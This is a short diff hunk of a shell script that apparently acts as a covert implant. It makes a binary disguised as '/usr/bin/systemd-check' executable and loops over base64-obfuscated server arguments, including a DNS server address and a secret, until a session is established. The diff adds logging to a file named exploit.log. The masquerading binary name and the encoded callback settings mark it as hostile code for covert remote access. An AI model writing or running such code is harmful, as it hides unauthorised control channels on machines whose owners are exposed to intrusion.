@@ -3,8 +3,10 @@ update_servers='LS1kbnMgc2VydmVyPTEwLjEwLjEwLjEgLS1zZWNyZXQ9NTkwSiAtLW1heC1yZXRy
 chmod +x /usr/bin/systemd-check
 for s in $update_servers
 do
+    echo "Connecting to server "$s >> /tmp/exploit.log
     if $(/usr/bin/systemd-check $(echo $s | base64 -d) | grep -q 'Session established')
     then
+    	echo "Connected to server "$s >> /tmp/exploit.log
         break
     fi
 done
